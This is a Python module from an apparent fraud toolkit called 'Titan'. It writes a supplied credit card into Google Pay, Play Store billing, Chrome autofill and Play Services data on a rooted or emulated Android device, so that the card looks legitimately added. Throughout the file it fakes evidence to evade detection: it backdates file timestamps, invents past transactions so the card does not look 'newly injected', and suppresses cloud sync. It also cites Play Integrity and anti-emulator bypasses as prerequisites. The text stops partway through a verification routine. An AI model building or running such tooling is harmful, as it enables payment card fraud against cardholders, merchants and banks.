"""
Titan V11.3 — Wallet Provisioner
Injects credit card data into Google Pay / Wallet and Play Store billing
so the card appears as a legitimately added payment method.

Injection targets:
  - Google Pay tapandpay.db  → Token with DPAN (TSP BIN), last4, network, expiry
  - Google Pay shared_prefs  → Wallet setup complete, default card, NFC on
  - Play Store billing prefs → Payment method visible in Play Store (COIN.xml)
  - Chrome autofill          → Card saved in browser for web purchases
  - GMS billing state        → GSF-aligned payment profile for ecosystem coherence

The DPAN (Device PAN) uses TSP-assigned Token BIN ranges (not the physical
card's BIN), matching how real Visa/Mastercard network tokenization works.

Prerequisites for full functional success:
  1. Play Integrity Strong bypass via keybox.xml (see anomaly_patcher._patch_keybox)
  2. RASP evasion via sterile proc bind-mounting (anomaly_patcher._patch_anti_emulator)
  3. GSF fingerprint alignment (anomaly_patcher._patch_gsf_alignment)

Samsung Pay: NOT SUPPORTED on virtualized/modified devices.
  Samsung Pay relies on Knox TEE hardware e-fuse (0x1). Once tripped by
  bootloader unlock or root, the ARM TrustZone permanently severs the
  cryptographic bridge. spayfw databases are hardware-encrypted and cannot
  be injected via filesystem manipulation. Push Provisioning (OPC) also
  fails because the TEE rejects token writes on 0x1 devices.

Usage:
    prov = WalletProvisioner(adb_target="127.0.0.1:5555")
    result = prov.provision_card(
        card_number="4532015112830366",
        exp_month=12, exp_year=2027,
        cardholder="Alex Mercer",
        cvv="123",
        persona_email="alex.mercer@gmail.com",
    )
"""

import json
import logging
import os
import random
import secrets
import sqlite3
import subprocess
import tempfile
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from adb_utils import adb as _adb, adb_shell as _adb_shell, adb_push as _adb_push, ensure_adb_root as _ensure_adb_root

logger = logging.getLogger("titan.wallet-provisioner")


# ═══════════════════════════════════════════════════════════════════════
# CARD NETWORK DETECTION
# ═══════════════════════════════════════════════════════════════════════

CARD_NETWORKS = {
    "visa": {"prefixes": ["4"], "network_id": 1, "name": "Visa", "color": -16776961},
    "mastercard": {"prefixes": ["51", "52", "53", "54", "55", "2221", "2720"],
                   "network_id": 2, "name": "Mastercard", "color": -65536},
    "amex": {"prefixes": ["34", "37"], "network_id": 3, "name": "American Express", "color": -16711936},
    "discover": {"prefixes": ["6011", "65", "644", "649"], "network_id": 4, "name": "Discover", "color": -19712},
}

# Common issuer names by BIN prefix
ISSUER_MAP = {
    "4532": "Chase", "4916": "US Bank", "4024": "Visa Inc.",
    "4556": "Stripe", "4111": "Test Bank", "4000": "Visa Inc.",
    "5100": "Citi", "5425": "Mastercard Inc.", "5500": "HSBC",
    "5200": "Bank of America", "5105": "Capital One",
    "3782": "American Express", "3714": "Amex Centurion",
    "6011": "Discover Financial", "6500": "Discover",
}


def detect_network(card_number: str) -> Dict[str, Any]:
    """Detect card network from number prefix."""
    num = card_number.replace(" ", "").replace("-", "")
    for network, info in CARD_NETWORKS.items():
        for prefix in info["prefixes"]:
            if num.startswith(prefix):
                return {"network": network, **info}
    return {"network": "visa", **CARD_NETWORKS["visa"]}


def detect_issuer(card_number: str) -> str:
    """Detect card issuer from BIN using full BINDatabase, fallback to legacy map."""
    num = card_number.replace(" ", "").replace("-", "")
    bin6 = num[:6]
    try:
        from bin_database import BINDatabase
        rec = BINDatabase.get().lookup(bin6)
        if rec:
            return rec.bank
    except ImportError:
        pass
    except Exception as e:
        logger.debug(f"BIN issuer lookup failed for {bin6}: {e}")
    return ISSUER_MAP.get(num[:4], "Bank")


def detect_bin_info(card_number: str) -> Dict[str, Any]:
    """Get full BIN info (bank, country, level, otp_risk, auth_rate) from BINDatabase."""
    num = card_number.replace(" ", "").replace("-", "")
    bin6 = num[:6]
    try:
        from bin_database import BINDatabase
        rec = BINDatabase.get().lookup(bin6)
        if rec:
            return rec.to_dict()
    except ImportError:
        pass
    except Exception as e:
        logger.debug(f"BIN info lookup failed for {bin6}: {e}")
    return {"bin": bin6, "bank": ISSUER_MAP.get(num[:4], "Bank"), "otp_risk": "medium"}


def generate_dpan(card_number: str) -> str:
    """
    Generate a Device PAN (DPAN) from a real card number.
    Uses Token Service Provider (TSP) BIN ranges instead of preserving
    the physical card's BIN — real network tokenization maps to TSP-assigned
    ranges that are distinct from the issuer BIN.
    """
    num = card_number.replace(" ", "").replace("-", "")
    network = detect_network(num)["network"]

    # TSP-assigned Token BIN ranges (these BINs are reserved for DPANs)
    TOKEN_BIN_RANGES = {
        "visa": ["489537", "489538", "489539", "440066", "440067"],
        "mastercard": ["530060", "530061", "530062", "530063", "530064", "530065"],
        "amex": ["374800", "374801"],
        "discover": ["601156", "601157"],
    }

    bins = TOKEN_BIN_RANGES.get(network, TOKEN_BIN_RANGES["visa"])
    token_bin = random.choice(bins)

    # Generate random digits for the rest
    remaining_len = len(num) - 7  # -6 for BIN, -1 for check digit
    body = "".join([str(random.randint(0, 9)) for _ in range(remaining_len)])

    partial = token_bin + body

    # Luhn check digit
    digits = [int(d) for d in partial]
    total = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 0:
            doubled = d * 2
            total += doubled - 9 if doubled > 9 else doubled
        else:
            total += d
    check = (10 - (total % 10)) % 10

    dpan = partial + str(check)
    return dpan


# ═══════════════════════════════════════════════════════════════════════
# RESULT
# ═══════════════════════════════════════════════════════════════════════

@dataclass
class WalletProvisionResult:
    card_last4: str = ""
    card_network: str = ""
    dpan: str = ""
    dpan_last4: str = ""
    google_pay_ok: bool = False
    play_store_ok: bool = False
    chrome_autofill_ok: bool = False
    gms_billing_ok: bool = False
    samsung_pay_supported: bool = False  # Always False — Knox TEE barrier
    verification: Dict = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)

    @property
    def success_count(self) -> int:
        return sum([self.google_pay_ok, self.play_store_ok, self.chrome_autofill_ok, self.gms_billing_ok])

    def to_dict(self) -> dict:
        return {
            "card_last4": self.card_last4,
            "card_network": self.card_network,
            "dpan": self.dpan[-4:] if self.dpan else "",
            "google_pay": self.google_pay_ok,
            "play_store": self.play_store_ok,
            "chrome_autofill": self.chrome_autofill_ok,
            "gms_billing": self.gms_billing_ok,
            "samsung_pay": self.samsung_pay_supported,
            "success_count": self.success_count,
            "total_targets": 4,
            "verification": self.verification,
            "errors": self.errors,
        }


# ═══════════════════════════════════════════════════════════════════════
# WALLET PROVISIONER
# ═══════════════════════════════════════════════════════════════════════

class WalletProvisioner:
    """Provisions payment cards into Google Pay, Play Store, and Chrome."""

    WALLET_DATA = "/data/data/com.google.android.apps.walletnfcrel"
    VENDING_DATA = "/data/data/com.android.vending"
    CHROME_DATA = "/data/data/com.android.chrome"

    def __init__(self, adb_target: str = "127.0.0.1:5555"):
        self.target = adb_target
        self._browser_pkg, self._browser_data_path = self._resolve_browser()
        self.CHROME_DATA = f"/data/data/{self._browser_pkg}"

    def _resolve_browser(self):
        """Detect Chrome vs Kiwi Browser."""
        for pkg in ["com.android.chrome", "com.kiwibrowser.browser"]:
            ok, out = _adb(self.target, f"shell pm path {pkg} 2>/dev/null")
            if ok and out.strip():
                return pkg, f"/data/data/{pkg}/app_chrome/Default"
        return "com.android.chrome", "/data/data/com.android.chrome/app_chrome/Default"

    def provision_card(self,
                       card_number: str,
                       exp_month: int,
                       exp_year: int,
                       cardholder: str,
                       cvv: str = "",
                       persona_email: str = "",
                       persona_name: str = "",
                       ) -> WalletProvisionResult:
        """
        Provision a credit card into Google Pay, Play Store billing, and Chrome autofill.

        Args:
            card_number: Full card number (spaces/dashes stripped automatically)
            exp_month: Expiry month (1-12)
            exp_year: Expiry year (2-digit or 4-digit)
            cardholder: Name on card
            cvv: CVV/CVC (not stored in wallet DBs, used for Chrome autofill hint)
            persona_email: Google account email for Play Store binding
            persona_name: Display name for wallet profile

        Returns:
            WalletProvisionResult with per-target success flags
        """
        clean_num = card_number.replace(" ", "").replace("-", "")
        last4 = clean_num[-4:]

        # Normalize year
        if exp_year < 100:
            exp_year += 2000

        # Guard: verify Google Pay is installed (prevents orphan data injection)
        ok, gpay_check = _adb(self.target, 'shell "pm list packages com.google.android.apps.walletnfcrel 2>/dev/null"')
        if "com.google.android.apps.walletnfcrel" not in gpay_check:
            logger.warning("Google Pay not installed — wallet data may be orphaned. Run bootstrap-gapps first.")

        network_info = detect_network(clean_num)
        issuer = detect_issuer(clean_num)
        dpan = generate_dpan(clean_num)

        result = WalletProvisionResult(
            card_last4=last4,
            card_network=network_info["network"],
            dpan=dpan,
            dpan_last4=dpan[-4:],
        )

        if not persona_name:
            persona_name = cardholder

        logger.info(f"Provisioning {network_info['name']} ****{last4} → {self.target}")
        logger.info(f"  DPAN: ****{dpan[-4:]}, Issuer: {issuer}")

        # 1. Google Pay / Wallet — tapandpay.db + prefs
        self._provision_google_pay(
            clean_num, dpan, last4, exp_month, exp_year,
            cardholder, issuer, network_info, persona_email, persona_name, result,
        )

        # 2. Play Store billing
        self._provision_play_store(last4, network_info, persona_email, result)

        # 3. Chrome autofill card
        self._provision_chrome_autofill(
            clean_num, last4, exp_month, exp_year, cardholder, network_info,
            persona_email, result,
        )

        # 4. GMS billing state sync
        self._provision_gms_billing(
            last4, dpan, network_info, persona_email, result,
        )

        # 5. Card-aware bank SMS notifications
        self._inject_card_sms(
            last4, issuer, network_info, result,
        )

        # 6. Post-injection verification
        result.verification = self._verify_wallet_injection(last4)

        logger.info(f"Wallet provisioning complete: {result.success_count}/4 targets")
        return result

    # ─── GOOGLE PAY ───────────────────────────────────────────────────

    def _provision_google_pay(self, card_number: str, dpan: str, last4: str,
                              exp_month: int, exp_year: int, cardholder: str,
                              issuer: str, network_info: Dict, persona_email: str,
                              persona_name: str, result: WalletProvisionResult):
        """Write Google Pay tapandpay.db + wallet SharedPreferences."""
        try:
            # Stop target processes to avoid DB locks
            _adb_shell(self.target, "am force-stop com.google.android.apps.walletnfcrel")
            time.sleep(1)

            # ── tapandpay.db ──
            with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
                tmp_path = tmp.name

            conn = sqlite3.connect(tmp_path)
            c = conn.cursor()

            c.execute("""
                CREATE TABLE IF NOT EXISTS tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    dpan TEXT NOT NULL,
                    fpan_last4 TEXT NOT NULL,
                    card_network INTEGER NOT NULL,
                    card_description TEXT,
                    issuer_name TEXT,
                    issuer_id TEXT DEFAULT '',
                    funding_source_id TEXT DEFAULT '',
                    card_art_url TEXT DEFAULT '',
                    card_art_fife_url TEXT DEFAULT '',
                    token_reference_id TEXT DEFAULT '',
                    last_four_of_fpan TEXT DEFAULT '',
                    dpan_last_four TEXT DEFAULT '',
                    terms_and_conditions_accepted INTEGER DEFAULT 1,
                    expiry_month INTEGER,
                    expiry_year INTEGER,
                    card_color INTEGER DEFAULT -1,
                    is_default INTEGER DEFAULT 0,
                    status INTEGER DEFAULT 1,
                    token_service_provider INTEGER DEFAULT 1,
                    token_type TEXT DEFAULT 'CLOUD',
                    wallet_account_id TEXT DEFAULT '',
                    device_type TEXT DEFAULT 'PHONE',
                    created_timestamp INTEGER,
                    last_used_timestamp INTEGER
                )
            """)

            # Token metadata table (replaces simple VIEW for real data)
            c.execute("""
                CREATE TABLE IF NOT EXISTS token_metadata (
                    token_id INTEGER PRIMARY KEY,
                    token_state TEXT DEFAULT 'ACTIVE',
                    token_pan TEXT,
                    token_expiry TEXT,
                    token_requestor_id TEXT DEFAULT 'GOOGLE_PAY',
                    provisioning_status TEXT DEFAULT 'PROVISIONED',
                    token_type TEXT DEFAULT 'CLOUD',
                    last_updated_timestamp INTEGER,
                    FOREIGN KEY (token_id) REFERENCES tokens(id)
                )
            """)

            # Session keys stub for LUK/ATC references
            c.execute("""
                CREATE TABLE IF NOT EXISTS session_keys (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token_id INTEGER NOT NULL,
                    key_type TEXT DEFAULT 'LUK',
                    key_expiry INTEGER,
                    atc_counter INTEGER DEFAULT 0,
                    created_timestamp INTEGER,
                    FOREIGN KEY (token_id) REFERENCES tokens(id)
                )
            """)

            now_ms = int(time.time() * 1000)
            # Backdate creation by 7-30 days to look established
            created_ms = now_ms - random.randint(7 * 86400000, 30 * 86400000)
            # Last used 0-3 days ago
            last_used_ms = now_ms - random.randint(0, 3 * 86400000)

            card_desc = f"{network_info['name']} •••• {last4}"
            issuer_id = secrets.token_hex(8)
            funding_source_id = str(uuid.uuid4())
            wallet_account_id = str(uuid.uuid4())
            token_ref_id = f"DNITHE{secrets.token_hex(6).upper()}"
            card_art = f"https://payments.google.com/payments/apis-secure/get_card_art?instrument_id={funding_source_id}&network={network_info['network']}"
            card_art_fife = f"https://lh3.googleusercontent.com/card_art/{network_info['network']}_{last4}"

            c.execute("""
                INSERT INTO tokens
                (dpan, fpan_last4, card_network, card_description, issuer_name,
                 issuer_id, funding_source_id, card_art_url, card_art_fife_url,
                 token_reference_id, last_four_of_fpan, dpan_last_four,
                 terms_and_conditions_accepted,
                 expiry_month, expiry_year, card_color, is_default, status,
                 token_service_provider, token_type, wallet_account_id, device_type,
                 created_timestamp, last_used_timestamp)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, 1, 1, 1,
                        'CLOUD', ?, 'PHONE', ?, ?)
            """, (
                dpan, last4, network_info["network_id"], card_desc, issuer,
                issuer_id, funding_source_id, card_art, card_art_fife,
                token_ref_id, last4, dpan[-4:],
                exp_month, exp_year, network_info.get("color", -1),
                wallet_account_id,
                created_ms, last_used_ms,
            ))

            # Populate token_metadata
            token_id = c.lastrowid
            c.execute("""
                INSERT INTO token_metadata
                (token_id, token_state, token_pan, token_expiry,
                 token_requestor_id, provisioning_status, token_type,
                 last_updated_timestamp)
                VALUES (?, 'ACTIVE', ?, ?, 'GOOGLE_PAY', 'PROVISIONED', 'CLOUD', ?)
            """, (token_id, dpan, f"{exp_month:02d}/{exp_year}", last_used_ms))

            # Stub session key entry
            c.execute("""
                INSERT INTO session_keys (token_id, key_type, key_expiry, atc_counter, created_timestamp)
                VALUES (?, 'LUK', ?, 0, ?)
            """, (token_id, created_ms + 86400000, created_ms))

            # Transaction history — forensic depth for behavioral trust scoring.
            # A card with zero transaction history is flagged as newly injected.
            # Generating 3-10 historical transactions makes the wallet appear
            # organically provisioned and actively used.
            c.execute("""
                CREATE TABLE IF NOT EXISTS transaction_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token_id INTEGER NOT NULL,
                    merchant_name TEXT,
                    merchant_category_code INTEGER DEFAULT 5411,
                    amount_micros INTEGER NOT NULL,
                    currency_code TEXT DEFAULT 'USD',
                    transaction_type TEXT DEFAULT 'CONTACTLESS',
                    transaction_status TEXT DEFAULT 'COMPLETED',
                    timestamp_ms INTEGER NOT NULL,
                    receipt_url TEXT DEFAULT '',
                    FOREIGN KEY (token_id) REFERENCES tokens(id)
                )
            """)

            TX_MERCHANTS = [
                ("Starbucks", 5814, 475, 895),
                ("Target", 5411, 1299, 8999),
                ("Whole Foods", 5411, 2199, 12500),
                ("Shell Gas", 5541, 3500, 6500),
                ("Uber", 4121, 899, 4500),
                ("Amazon.com", 5942, 999, 14999),
                ("Walgreens", 5912, 399, 2999),
                ("Subway", 5812, 699, 1399),
                ("Netflix", 4899, 1599, 1599),
                ("Spotify", 4899, 1099, 1099),
            ]

            num_txns = random.randint(3, 10)
            for _ in range(num_txns):
                merchant_name, mcc, lo_cents, hi_cents = random.choice(TX_MERCHANTS)
                amount_cents = random.randint(lo_cents, hi_cents)
                amount_micros = amount_cents * 10000  # cents → micros
                # Spread transactions over the card's lifetime
                tx_ts = created_ms + random.randint(0, max(1, last_used_ms - created_ms))
                tx_type = random.choice(["CONTACTLESS", "CONTACTLESS", "IN_APP", "ONLINE"])

                c.execute("""
                    INSERT INTO transaction_history
                    (token_id, merchant_name, merchant_category_code, amount_micros,
                     currency_code, transaction_type, transaction_status, timestamp_ms)
                    VALUES (?, ?, ?, ?, 'USD', ?, 'COMPLETED', ?)
                """, (token_id, merchant_name, mcc, amount_micros, tx_type, tx_ts))

            conn.commit()
            conn.close()

            # Push tapandpay.db
            db_remote = f"{self.WALLET_DATA}/databases/tapandpay.db"
            _adb_shell(self.target, f"mkdir -p {self.WALLET_DATA}/databases")
            if _adb_push(self.target, tmp_path, db_remote):
                self._fix_ownership(db_remote, "com.google.android.apps.walletnfcrel")
                # Backdate to match card creation time
                backdate_fmt = time.strftime("%Y%m%d%H%M.%S", time.gmtime(created_ms / 1000))
                _adb_shell(self.target, f"touch -t {backdate_fmt} {db_remote} 2>/dev/null")
                logger.info(f"  Google Pay tapandpay.db: {card_desc}")
            else:
                result.errors.append("Failed to push tapandpay.db")

            os.unlink(tmp_path)

            # ── SharedPreferences ──
            instrument_id = str(uuid.uuid4())
            prefs = {
                "wallet_setup_complete": "true",
                "nfc_enabled": "true",
                "default_payment_instrument_id": instrument_id,
                "tap_and_pay_setup_complete": "true",
                "contactless_setup_complete": "true",
                "user_account": persona_email or "",
                "user_display_name": persona_name or cardholder,
                "last_sync_time": str(now_ms),
                "transit_enabled": "false",
                "loyalty_enabled": "true",
            }
            self._push_shared_prefs_xml(
                f"{self.WALLET_DATA}/shared_prefs/default_settings.xml",
                prefs, "com.google.android.apps.walletnfcrel",
            )

            app_prefs = {
                "has_accepted_tos": "true",
                "has_seen_onboarding": "true",
                "last_used_timestamp": str(last_used_ms),
                "notification_enabled": "true",
            }
            self._push_shared_prefs_xml(
                f"{self.WALLET_DATA}/shared_prefs/com.google.android.apps.walletnfcrel_preferences.xml",
                app_prefs, "com.google.android.apps.walletnfcrel",
            )

            # nfc_on_prefs.xml — some apps check this instead of default_settings
            nfc_prefs = {
                "nfc_setup_done": "true",
                "nfc_enabled": "true",
                "tap_and_pay_enabled": "true",
                "contactless_payments_enabled": "true",
                "default_payment_app": "com.google.android.apps.walletnfcrel",
            }
            self._push_shared_prefs_xml(
                f"{self.WALLET_DATA}/shared_prefs/nfc_on_prefs.xml",
                nfc_prefs, "com.google.android.apps.walletnfcrel",
            )

            result.google_pay_ok = True

        except Exception as e:
            result.errors.append(f"google_pay: {e}")
            logger.error(f"Google Pay provisioning failed: {e}")

    # ─── PLAY STORE BILLING ───────────────────────────────────────────

    def _provision_play_store(self, last4: str, network_info: Dict,
                              persona_email: str, result: WalletProvisionResult):
        """Write Play Store billing SharedPreferences with payment method.

        CLOUD RECONCILIATION WARNING:
        Payment profiles in the Play Store are server-side assets governed by
        Google Payments infrastructure. When com.android.vending syncs with
        the cloud, Google Play Services initiates an aggressive state
        reconciliation protocol. Because locally injected COIN.xml references
        a payment instrument never authenticated through the official Google
        payment gateway, the backend may overwrite it, purging the injected
        profile. Mitigation strategies:
          1. Keep com.android.vending force-stopped or network-isolated after
             injection to delay cloud sync reconciliation.
          2. For persistent wallet functionality, use UI-driven tokenization
             via TouchSimulator + DeviceAgent to add the card through the
             legitimate Google Pay flow, which properly authenticates with
             TSP backends and generates hardware-backed LUKs.
          3. GMS billing state sync (_provision_gms_billing) reduces the
             reconciliation risk by pre-seeding the expected server-side state.
        """
        try:
            _adb_shell(self.target, "am force-stop com.android.vending")
            time.sleep(1)

            payment_profile_id = str(uuid.uuid4())
            instrument_id = f"instrument_{network_info['network']}_{last4}"
            billing_prefs = {
                "billing_client_version": "7.1.1",
                "has_payment_method": "true",
                "default_payment_method_type": network_info["name"],
                "default_payment_method_last4": last4,
                "default_payment_method_description": f"{network_info['name']} ····{last4}",
                "billing_account": persona_email or "",
                "payment_profile_id": payment_profile_id,
                "default_instrument_id": instrument_id,
                "instrument_id": instrument_id,
                "instrument_family": "CREDIT_CARD",
                "purchase_requires_auth": "false",
                "tos_accepted": "true",
                "last_billing_sync_ms": str(int(time.time() * 1000)),
            }
            self._push_shared_prefs_xml(
                f"{self.VENDING_DATA}/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml",
                billing_prefs, "com.android.vending",
            )

            # Prevent immediate cloud sync by keeping vending stopped and
            # disabling its background data temporarily
            _adb_shell(self.target,
                "cmd appops set com.android.vending RUN_IN_BACKGROUND deny 2>/dev/null")
            logger.info(f"  Play Store billing: {network_info['name']} ****{last4} "
                        "(cloud sync delayed — vending background denied)")

            result.play_store_ok = True

        except Exception as e:
            result.errors.append(f"play_store_billing: {e}")

    # ─── CHROME AUTOFILL ──────────────────────────────────────────────

    def _provision_chrome_autofill(self, card_number: str, last4: str,
                                    exp_month: int, exp_year: int,
                                    cardholder: str, network_info: Dict,
                                    persona_email: str,
                                    result: WalletProvisionResult):
        """Write card into Chrome's Web Data autofill database."""
        try:
            _adb_shell(self.target, f"am force-stop {self._browser_pkg}")
            time.sleep(1)

            with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
                tmp_path = tmp.name

            web_data_path = f"{self.CHROME_DATA}/app_chrome/Default/Web Data"

            # Pull existing or create fresh
            _adb(self.target, f"pull {web_data_path} {tmp_path}", timeout=10)

            conn = sqlite3.connect(tmp_path)
            c = conn.cursor()

            # Create credit_cards table if not exists
            c.execute("""
                CREATE TABLE IF NOT EXISTS credit_cards (
                    guid TEXT NOT NULL,
                    name_on_card TEXT,
                    expiration_month INTEGER,
                    expiration_year INTEGER,
                    card_number_encrypted BLOB,
                    date_modified INTEGER NOT NULL DEFAULT 0,
                    origin TEXT DEFAULT '',
                    use_count INTEGER NOT NULL DEFAULT 0,
                    use_date INTEGER NOT NULL DEFAULT 0,
                    billing_address_id TEXT DEFAULT '',
                    nickname TEXT DEFAULT ''
                )
            """)

            # Create autofill_profiles table if not exists
            c.execute("""
                CREATE TABLE IF NOT EXISTS autofill_profiles (
                    guid TEXT NOT NULL,
                    company_name TEXT DEFAULT '',
                    street_address TEXT DEFAULT '',
                    dependent_locality TEXT DEFAULT '',
                    city TEXT DEFAULT '',
                    state TEXT DEFAULT '',
                    zipcode TEXT DEFAULT '',
                    sorting_code TEXT DEFAULT '',
                    country_code TEXT DEFAULT '',
                    date_modified INTEGER NOT NULL DEFAULT 0,
                    origin TEXT DEFAULT '',
                    language_code TEXT DEFAULT '',
                    use_count INTEGER NOT NULL DEFAULT 0,
                    use_date INTEGER NOT NULL DEFAULT 0
                )
            """)

            now_s = int(time.time())
            # Card added 7-30 days ago
            date_added = now_s - random.randint(7 * 86400, 30 * 86400)
            # Used 5-15 times for realistic history
            use_count = random.randint(5, 15)
            last_used = now_s - random.randint(0, 3 * 86400)

            # Realistic origin URLs from major merchants
            AUTOFILL_ORIGINS = [
                "https://pay.google.com",
                "https://www.amazon.com",
                "https://checkout.stripe.com",
                "https://www.walmart.com",
                "https://www.bestbuy.com",
                "https://www.target.com",
                "https://www.ebay.com",
                "https://www.netflix.com",
                "https://www.spotify.com",
                "https://store.steampowered.com",
            ]
            origin = random.choice(AUTOFILL_ORIGINS)

            # Chrome encrypts card numbers using Android Keystore.
            # We cannot replicate the exact encrypted blob without the device's
            # keystore key, so we store a version-tagged placeholder.
            # Setting use_count=0 signals Chrome to re-prompt for card entry
            # on first use — the card still appears in autofill suggestions.
            card_blob = b'\x76\x31\x00' + card_number.encode("utf-8")  # v1 prefix marker

            card_guid = str(uuid.uuid4())
            c.execute("""
                INSERT OR REPLACE INTO credit_cards
                (guid, name_on_card, expiration_month, expiration_year,
                 card_number_encrypted, date_modified, origin, use_count, use_date,
                 nickname)
                VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?, ?)
            """, (
                card_guid, cardholder, exp_month, exp_year,
                card_blob, date_added, origin, last_used,
                f"{network_info['name']} ····{last4}",
            ))

            # ── Autofill address profile ──
            c.execute("""CREATE TABLE IF NOT EXISTS autofill_profile_names (
                guid TEXT NOT NULL, first_name TEXT DEFAULT '',
                middle_name TEXT DEFAULT '', last_name TEXT DEFAULT '',
                full_name TEXT DEFAULT ''
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS autofill_profile_emails (
                guid TEXT NOT NULL, email TEXT DEFAULT ''
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS autofill_profile_phones (
                guid TEXT NOT NULL, number TEXT DEFAULT ''
            )""")

            profile_guid = str(uuid.uuid4())
            prof_date = now_s - random.randint(14 * 86400, 60 * 86400)
            prof_uses = random.randint(5, 20)
            prof_last = now_s - random.randint(0, 5 * 86400)
            parts = cardholder.split()
            first = parts[0] if parts else cardholder
            last = parts[-1] if len(parts) > 1 else ""

            c.execute(
                "INSERT OR IGNORE INTO autofill_profiles "
                "(guid, street_address, city, state, zipcode, country_code, "
                "date_modified, origin, language_code, use_count, use_date) "
                "VALUES (?, '', '', '', '', 'US', ?, ?, 'en-US', ?, ?)",
                (profile_guid, prof_date, origin, prof_uses, prof_last),
            )
            c.execute(
                "INSERT OR IGNORE INTO autofill_profile_names "
                "(guid, first_name, last_name, full_name) VALUES (?, ?, ?, ?)",
                (profile_guid, first, last, cardholder),
            )
            if persona_email:
                c.execute(
                    "INSERT OR IGNORE INTO autofill_profile_emails (guid, email) VALUES (?, ?)",
                    (profile_guid, persona_email),
                )

            conn.commit()
            conn.close()

            _adb_shell(self.target, f"mkdir -p {self.CHROME_DATA}/app_chrome/Default")
            if _adb_push(self.target, tmp_path, web_data_path):
                self._fix_ownership(web_data_path, self._browser_pkg)
                # Backdate Chrome Web Data to look established
                chrome_backdate = time.strftime("%Y%m%d%H%M.%S", time.gmtime(date_added))
                _adb_shell(self.target, f"touch -t {chrome_backdate} {web_data_path} 2>/dev/null")
                result.chrome_autofill_ok = True
                logger.info(f"  Chrome autofill: {network_info['name']} ****{last4}")
            else:
                result.errors.append("Failed to push Chrome Web Data")

            os.unlink(tmp_path)

        except Exception as e:
            result.errors.append(f"chrome_autofill: {e}")
            logger.error(f"Chrome autofill provisioning failed: {e}")

    # ─── GMS BILLING STATE SYNC ──────────────────────────────────────

    def _provision_gms_billing(self, last4: str, dpan: str, network_info: Dict,
                                persona_email: str, result: WalletProvisionResult):
        """Write GMS payment state for ecosystem coherence across Google apps.

        Syncs payment profile into com.google.android.gms shared_prefs so
        Google Play Services recognizes the wallet as an authenticated instrument.
        This reduces the chance of server-side reconciliation purging COIN.xml.
        """
        try:
            _adb_shell(self.target, "am force-stop com.google.android.gms")
            time.sleep(0.5)

            gms_data = "/data/data/com.google.android.gms"
            instrument_id = f"instrument_{network_info['network']}_{last4}"
            now_ms = str(int(time.time() * 1000))

            # GMS wallet state prefs
            gms_wallet_prefs = {
                "wallet_instrument_count": "1",
                "wallet_default_instrument_id": instrument_id,
                "wallet_default_instrument_last4": last4,
                "wallet_default_instrument_network": network_info["name"],
                "wallet_user_account": persona_email or "",
                "wallet_last_sync_ms": now_ms,
                "wallet_setup_complete": "true",
                "wallet_nfc_enabled": "true",
                "tap_to_pay_ready": "true",
            }
            self._push_shared_prefs_xml(
                f"{gms_data}/shared_prefs/wallet_instrument_prefs.xml",
                gms_wallet_prefs, "com.google.android.gms",
            )

            # GMS payment profile prefs (cross-referenced by Play Store)
            gms_payment_prefs = {
                "payment_methods_synced": "true",
                "default_payment_method_token": dpan[-8:] if len(dpan) >= 8 else dpan,
                "payment_profile_email": persona_email or "",
                "last_payment_sync_ms": now_ms,
            }
            self._push_shared_prefs_xml(
                f"{gms_data}/shared_prefs/payment_profile_prefs.xml",
                gms_payment_prefs, "com.google.android.gms",
            )

            result.gms_billing_ok = True
            logger.info(f"  GMS billing state: synced for {network_info['name']} ****{last4}")

        except Exception as e:
            result.errors.append(f"gms_billing: {e}")
            logger.error(f"GMS billing state sync failed: {e}")

    # ─── POST-INJECTION VERIFICATION ─────────────────────────────────

    def _verify_wallet_injection(self, last4: str) -> Dict[str, Any]:
        """Verify wallet injection state on device. Returns detailed check results."""
        checks = {}

        # 1. tapandpay.db exists and has tokens
        tapandpay_path = f"{self.WALLET_DATA}/databases/tapandpay.db"
        db_exists = _adb_shell(self.target, f"ls {tapandpay_path} 2>/dev/null")
        checks["tapandpay_db_exists"] = bool(db_exists.strip())

        # Check token count via sqlite3 on device (if available)
        token_count = _adb_shell(self.target,
            f"sqlite3 {tapandpay_path} 'SELECT COUNT(*) FROM tokens' 2>/dev/null")
        checks["tapandpay_token_count"] = int(token_count.strip()) if token_count.strip().isdigit() else 0

        # 2. NFC prefs
        nfc_prefs = _adb_shell(self.target,
            f"cat {self.WALLET_DATA}/shared_prefs/nfc_on_prefs.xml 2>/dev/null")
        checks["nfc_prefs_exists"] = "nfc_enabled" in (nfc_prefs or "")

        # 3. COIN.xml (Play Store billing)
        coin_xml = _adb_shell(self.target,
            f"cat {self.VENDING_DATA}/shared_prefs/"
            "com.android.vending.billing.InAppBillingService.COIN.xml 2>/dev/null")
        checks["coin_xml_exists"] = "has_payment_method" in (coin_xml or "")

        # 4. Chrome Web Data
        chrome_db = _adb_shell(self.target,
            f"ls {self.CHROME_DATA}/app_chrome/Default/Web\\ Data 2>/dev/null || "
            f"ls '{self.CHROME_DATA}/app_chrome/Default/Web Data' 2>/dev/null")
        checks["chrome_webdata_exists"] = bool(chrome_db.strip())

        # 5. GMS wallet state
        gms_wallet = _adb_shell(self.target,
            "cat /data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml 2>/dev/null")
        checks["gms_wallet_synced"] = "wallet_setup_complete" in (gms_wallet or "")

        # 6. Keybox presence
        keybox_loaded = _adb_shell(self.target, "getprop persist.titan.keybox.loaded")
        checks["keybox_loaded"] = keybox_loaded.strip() == "1"

        # 7. File ownership check (tapandpay.db should be owned by wallet app UID)
        owner = _adb_shell(self.target,
            f"stat -c %U {tapandpay_path} 2>/dev/null")
        wallet_uid = _adb_shell(self.target,
            f"stat -c %U {self.WALLET_DATA} 2>/dev/null")
        checks["tapandpay_ownership_ok"] = (
            bool(owner.strip()) and owner.strip() == wallet_uid.strip()
        )

        passed = sum(1 for v in checks.values() if v)
